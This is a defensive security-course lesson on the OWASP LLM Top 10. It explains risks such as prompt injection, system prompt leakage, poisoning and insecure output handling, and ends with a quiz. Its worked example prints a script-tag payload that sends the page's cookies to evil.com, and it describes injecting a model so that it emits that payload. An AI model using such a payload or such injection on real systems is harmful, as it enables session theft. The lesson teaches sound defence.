---
id: llm-top-10
title: The OWASP LLM Top 10
sidebar_position: 3
sidebar_label: OWASP LLM Top 10
description: The standard catalog of LLM-application risks — what it covers beyond prompt injection (insecure output handling, data leakage, supply chain, excessive agency), and how most map to classic security applied to a new component.
---

# The OWASP LLM Top 10

> **In one line:** Just as the [OWASP Top 10](/docs/appsec/owasp-top-10) maps web risks, the **OWASP LLM Top 10** maps the most critical risks of LLM applications — and the reassuring insight is that *most* of them are **familiar security problems** ([injection](/docs/appsec/injection), [insecure output handling](/docs/appsec/xss), [data leakage](/docs/foundations/cia-triad), [supply chain](/docs/secure-sdlc/supply-chain), [access control](/docs/appsec/broken-access-control)) showing up around a *new component*, plus a few genuinely AI-specific ones.

:::tip[In plain English]
Once AI features became common, the security community did what it always does: catalog the ways they go wrong. The **OWASP LLM Top 10** is that catalog — the LLM-application version of the [web Top 10](/docs/appsec/owasp-top-10) you already know. Here's the encouraging part for someone who's read this far: **you already understand most of it.** A lot of "AI security" is just *classic security with an LLM in the mix*. The model's output flowing unsanitized into a web page? That's [XSS](/docs/appsec/xss). The model leaking sensitive data it was given? That's a [confidentiality](/docs/foundations/cia-triad) failure. A poisoned model or library pulled into your app? That's [supply chain](/docs/secure-sdlc/supply-chain). The genuinely *new* risks cluster around the things that make LLMs special: they follow text instructions ([prompt injection](/docs/ai-security/prompt-injection)), they can be given autonomy and tools (excessive agency), and they can memorize and leak training data. This lesson is the map — so you can place any AI security concern, recognize the familiar ones, and focus your learning on the truly novel few.
:::

## The catalog (grouped by what's familiar vs. new)

The list evolves between editions (treat specifics as **dated** — see the note at the end), but the categories cluster cleanly. Rather than memorize numbers, group them by *how new they actually are*:

**The signature AI-specific risks** (the genuinely new ones to learn deeply):
- **Prompt Injection** — attacker text becomes instructions the model follows. The [defining LLM vulnerability](./prompt-injection); usually #1.
- **Excessive Agency** — giving the model too much autonomy/too many tools, so a manipulated model takes harmful real-world actions. (Its [own lesson](./excessive-agency).)
- **Sensitive Information Disclosure** — the model leaking data: secrets in its context, or memorized training data, surfaced to users who shouldn't see it.
- **System Prompt Leakage** — extracting the developer's hidden instructions (and any secrets foolishly placed there).

**Classic security, new component** (you already know these — apply existing skills):
- **Insecure Output Handling** — trusting model output downstream → it's just [injection/XSS](/docs/appsec/xss) again: model output flows into a browser, a shell, or a query and is executed. *Treat model output as untrusted input.*
- **Supply Chain** — compromised models, poisoned datasets, or vulnerable AI libraries/plugins → [supply-chain security](/docs/secure-sdlc/supply-chain) applied to AI components.
- **Data & Model Poisoning** — tampering with training/fine-tuning data to corrupt the model → an [integrity](/docs/foundations/cia-triad) attack on the model's "code."
- **Improper access control / insecure plugin design** — the model or its tools reaching data/actions without proper [authorization](/docs/appsec/broken-access-control) → classic access control around the new component.
- **Unbounded consumption / denial of service** — expensive queries exhausting resources or running up huge bills → [availability](/docs/network-security/ddos-mitigation) (and "denial of wallet").

:::note[Terms, defined once]
- **OWASP LLM Top 10** — the standard catalog of the most critical LLM-application security risks.
- **Insecure output handling** — trusting/forwarding model output without treating it as untrusted (a top cause of LLM-app bugs).
- **Sensitive information disclosure** — the model revealing data it shouldn't (context secrets or memorized training data).
- **Model/data poisoning** — corrupting training or fine-tuning data to manipulate the model's behavior.
- **Excessive agency** — granting an LLM too much autonomy or too many capabilities (covered in its [own lesson](./excessive-agency)).
- **System prompt leakage** — extracting the hidden developer instructions.
- **RAG (Retrieval-Augmented Generation)** — feeding the model retrieved documents at query time; a common pattern that creates an [indirect-injection](./prompt-injection) and access-control surface.
:::

:::note[Dated box: the 2025-edition IDs (verify current)]
The IDs and ordering **shift between editions** — internalize the categories above, not the numbers. As a *dated snapshot*, the 2025 edition of the OWASP Top 10 for LLM Applications reads:

| ID | Risk | ID | Risk |
|----|------|----|------|
| LLM01 | Prompt Injection | LLM06 | Excessive Agency |
| LLM02 | Sensitive Information Disclosure | **LLM07** | **System Prompt Leakage** |
| LLM03 | Supply Chain | **LLM08** | **Vector & Embedding Weaknesses (RAG)** |
| LLM04 | Data & Model Poisoning | LLM09 | Misinformation |
| LLM05 | Improper Output Handling | LLM10 | Unbounded Consumption |

Two entries are worth flagging because they're newer and easy to miss:
- **LLM07 — System Prompt Leakage:** extracting the developer's hidden instructions (and any secrets foolishly placed there). The lesson: don't put secrets or security-critical rules in the system prompt — it can be leaked.
- **LLM08 — Vector & Embedding Weaknesses:** the security holes specific to **RAG** (retrieval-augmented generation) — e.g., a poisoned or over-shared vector store letting one user retrieve another's data, or attacker-planted documents becoming [indirect-injection](./prompt-injection) payloads at retrieval time. As RAG became the default way to feed models private data, this earned its own entry.

These specific IDs are a **dated** fact — confirm the current edition's list before citing numbers.
:::

## The biggest "you already know this" risk: insecure output handling

Worth a dedicated look because it's the most common *and* the most overlooked, precisely because it's *not* novel:

:::note[Worked example: model output as the new injection vector]
Your AI feature generates HTML responses (or SQL, or shell commands) and your app renders/executes them. An attacker uses [prompt injection](./prompt-injection) to make the model output:

```
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

If your app renders that model output directly into the page — **stored [XSS](/docs/appsec/xss)**, exactly as in Chapter 3, except the malicious content came *from your own model* instead of a form field. The same applies if model output flows into a database query (→ [SQLi](/docs/appsec/injection)), a shell (→ [command injection](/docs/appsec/injection)), or a file path.

The fix is also exactly Chapter 3: **treat model output as untrusted input.** [Encode it for its context](/docs/appsec/xss), [parameterize](/docs/appsec/injection) it, validate it — the model is now just another untrusted source crossing a [trust boundary](/docs/foundations/trust-boundaries) into your system. The mistake teams make is *trusting the model's output because it's "theirs"* — but a model that can be [prompt-injected](./prompt-injection) can be made to emit anything. Output handling is where most AI features that "feel" secure actually leak: the AI part is novel, but the bug is the oldest one in the book.
:::

This is the unifying insight of the whole catalog: **an LLM is a new, untrusted, manipulable component inside your system** — so wherever it *receives* input, that's an [injection](./prompt-injection) surface; wherever its output *goes*, that's an [output-handling](/docs/appsec/xss) surface; whatever it can *access or do*, that's an [access-control](/docs/appsec/broken-access-control) and [agency](./excessive-agency) surface. Place it in your [data-flow diagram](/docs/secure-sdlc/threat-modeling) as an untrusted node and most of the Top 10 becomes "apply the security you already know to this node."

## Why it matters

- **It's the map of AI-application risk.** Like the web Top 10, it gives a shared, prioritized vocabulary for what can go wrong in LLM apps — essential for [threat-modeling](/docs/secure-sdlc/threat-modeling) AI features and talking about them precisely.
- **It shows AI security is mostly security.** The encouraging takeaway: most AI risks are familiar problems around a new component, so your ten chapters of security knowledge transfer directly. You only need to learn the genuinely novel few deeply.
- **It pinpoints what's actually new.** Prompt injection, excessive agency, and training-data leakage are where AI breaks new ground — so it tells you exactly where to focus the *new* learning.

## Common pitfalls

:::caution[Where people commonly trip up]
- **Treating AI security as wholly alien.** Most of the LLM Top 10 is classic security (injection, output handling, supply chain, access control) around a new component. Apply what you know; learn the few novel risks deeply.
- **Trusting model output.** Insecure output handling is a top, overlooked risk: model output flowing unsanitized into a browser/shell/query is XSS/injection. Treat output as untrusted.
- **Forgetting the model can leak its context.** Secrets, other users' data, or system-prompt contents placed in context can be disclosed. Don't put secrets in prompts; isolate per-user context.
- **Ignoring the AI supply chain.** Compromised models, poisoned datasets, and vulnerable AI plugins are real supply-chain risks. Vet and verify AI components like any dependency.
- **Memorizing the numbered list instead of the pattern.** The edition specifics shift; the durable skill is placing the LLM as an untrusted node and applying input/output/access controls around it.
- **Overlooking cost-based DoS.** Expensive LLM calls can be abused to exhaust resources or run up bills. Rate-limit and cap consumption.
:::

## Page checkpoint

<Quiz id="llm-top-10-page" title="Did the LLM Top 10 click?" sampleSize={3}>

<Question
  prompt="What is the reassuring insight about the OWASP LLM Top 10?"
  options={[
    { text: "AI security is entirely unlike anything before it" },
    { text: "Most of the risks are FAMILIAR security problems (injection, insecure output handling/XSS, data leakage, supply chain, access control) showing up around a new component, plus a few genuinely AI-specific ones — so your existing security knowledge largely transfers" },
    { text: "There are no real AI risks" },
    { text: "It only applies to image models" }
  ]}
  correct={1}
  explanation="A lot of 'AI security' is classic security with an LLM in the mix: output into a page is XSS, leaked data is a confidentiality failure, a poisoned model is supply chain. The genuinely new risks (prompt injection, excessive agency, training-data leakage) are the few to learn deeply."
  revisit={{ to: "/docs/ai-security/llm-top-10#the-catalog-grouped-by-whats-familiar-vs-new", label: "Familiar vs new" }}
/>

<Question
  prompt="A model's output containing `<script>...</script>` is rendered directly into a web page. What is this, and what's the fix?"
  options={[
    { text: "A brand-new AI-only vulnerability with no known fix" },
    { text: "Insecure output handling — it's stored XSS, except the malicious content came from your own model; fix it exactly like Chapter 3: treat model output as untrusted input and encode/parameterize/validate it for its context" },
    { text: "Prompt injection; rewrite the system prompt" },
    { text: "Nothing; model output is always safe" }
  ]}
  correct={1}
  explanation="Model output flowing unsanitized into a page is XSS — an old bug from a new source. Since a prompt-injected model can emit anything, treat its output as untrusted input crossing a trust boundary: encode for context, parameterize, validate. Trusting output 'because it's ours' is the mistake."
  revisit={{ to: "/docs/ai-security/llm-top-10#the-biggest-you-already-know-this-risk-insecure-output-handling", label: "Insecure output handling" }}
/>

<Question
  prompt="What's the unifying way to think about an LLM in your system for security purposes?"
  options={[
    { text: "As a fully trusted internal component" },
    { text: "As a new, untrusted, manipulable node — where it RECEIVES input is an injection surface, where its OUTPUT goes is an output-handling surface, and whatever it can ACCESS or DO is an access-control/agency surface; place it in your data-flow diagram as untrusted and apply known controls" },
    { text: "As a database" },
    { text: "As a firewall" }
  ]}
  correct={1}
  explanation="Treating the LLM as an untrusted node in your data-flow diagram makes most of the Top 10 fall out: inputs are injection surfaces, outputs need sanitization, and its access/actions need authorization. Most AI security becomes applying the security you know to this node."
  revisit={{ to: "/docs/ai-security/llm-top-10#the-biggest-you-already-know-this-risk-insecure-output-handling", label: "The LLM as untrusted node" }}
/>

<Question
  prompt="Which of these is a GENUINELY AI-specific risk (not just classic security around a new component)?"
  options={[
    { text: "Insecure output handling" },
    { text: "Prompt injection / excessive agency / training-data (sensitive information) leakage — these arise from what makes LLMs special: following text instructions, being given autonomy and tools, and memorizing data" },
    { text: "Supply-chain compromise" },
    { text: "Denial of service" }
  ]}
  correct={1}
  explanation="Insecure output handling, supply chain, and DoS are classic problems around a new component. The truly novel risks stem from LLM-specific traits: instruction-following text (prompt injection), granted autonomy/tools (excessive agency), and memorization (training-data leakage). Focus new learning there."
  revisit={{ to: "/docs/ai-security/llm-top-10#the-catalog-grouped-by-whats-familiar-vs-new", label: "The AI-specific risks" }}
/>

<Question
  prompt="Why should you NOT put secrets in a system prompt?"
  options={[
    { text: "System prompts can't hold text" },
    { text: "The model can leak its context — system prompt leakage and sensitive information disclosure mean an attacker may extract whatever's in the prompt (including secrets), so secrets belong in secure stores, not the model's context" },
    { text: "Secrets make the model slower" },
    { text: "It's fine to put secrets in prompts" }
  ]}
  correct={1}
  explanation="Prompt injection can extract the system prompt and other context contents. Anything in the model's context — including secrets carelessly placed there — can be disclosed. Keep secrets in a secrets manager and out of prompts; isolate per-user context."
  revisit={{ to: "/docs/ai-security/llm-top-10#the-catalog-grouped-by-whats-familiar-vs-new", label: "System prompt leakage" }}
/>

</Quiz>

:::note[A note on volatility]
The OWASP LLM Top 10 is newer and evolving faster than the web Top 10; **exact entries, names, and ordering shift between editions.** Treat the *categories and the underlying pattern* (LLM as an untrusted node; familiar risks + a few novel ones) as durable, and check the current edition for the precise list. This is a deliberately [version-pinned](/docs/foundations/threat-vuln-risk) topic.
:::

## What's next

→ Continue to [Excessive Agency & Tool Abuse](./excessive-agency) — the AI-specific risk that turns a [prompt-injected](./prompt-injection) model from a *talking* problem into an *acting* one, with real-world consequences.

→ **Going deeper:** the signature risk is [prompt injection](./prompt-injection); the classic bugs this catalog echoes are [Chapter 3](/docs/appsec); the supply-chain angle is [Chapter 4](/docs/secure-sdlc/supply-chain).
